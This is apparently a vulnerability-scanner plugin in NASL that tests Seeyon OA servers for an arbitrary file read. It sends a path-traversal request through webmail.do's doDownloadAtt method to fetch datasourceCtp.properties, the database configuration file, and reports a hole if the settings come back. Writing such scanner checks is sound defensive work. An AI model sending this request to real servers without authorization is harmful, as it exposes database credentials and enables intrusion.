include("compat.inc");


if (description)
{
  script_id(51799304);
  script_version("1.3");
  script_name(english:"Seeyon OA any file read");
  script_summary(english:"Seeyon OA any file read");
  script_set_attribute(attribute:"description", value:"Seeyon OA any file read.");
  script_set_attribute(attribute:"solution", value:"Seeyon OA any file read");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www");
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");

ports = get_kb_list("Services/www");
foreach port (ports){
	soc = open_sock_tcp(port);
	if (!soc)
	{
	  audit(AUDIT_SOCK_FAIL, port, appname);
	}
	if (get_kb_list("SSL/Transport/"+port)){
		res = http_get(item:"/seeyon/index.jsp", port:port);
		ssl_res = https_req_get(request:res, port:port);
		if("/main.do" >< ssl_res && "/seeyon" >< ssl_res ){
			req = http_get(item:"/seeyon/webmail.do?method=doDownloadAtt&filename=conf&filePath=../conf/datasourceCtp.properties", port:port);
			ssl_reqs = https_req_get(request:req, port:port);
			if("ctpDataSource.driverClassName=" >< ssl_reqs && "ctpDataSource.username=" >< ssl_reqs){
				security_hole(port:port, data:ssl_reqs);
			}	
		}
	}else{
		res = http_send_recv3(method: "GET", port: port, item: "/seeyon/index.jsp", add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
		if("200" >< res[0] && "/main.do" >< res[2] && "/seeyon" >< res[2]){
			req = http_send_recv3(method: "GET", data:data, port: port, item: "/seeyon/webmail.do?method=doDownloadAtt&filename=conf&filePath=../conf/datasourceCtp.properties", add_headers: make_array("Accept-Encoding", "gzip, deflate","Content-Type","application/x-www-form-urlencoded"));
			if("200" >< req[0] && "ctpDataSource.username=" >< req[2] && "ctpDataSource.driverClassName=" >< req[2]){
				security_hole(port:port, data:req[2]);
			}
		}
	}
close(soc);
}
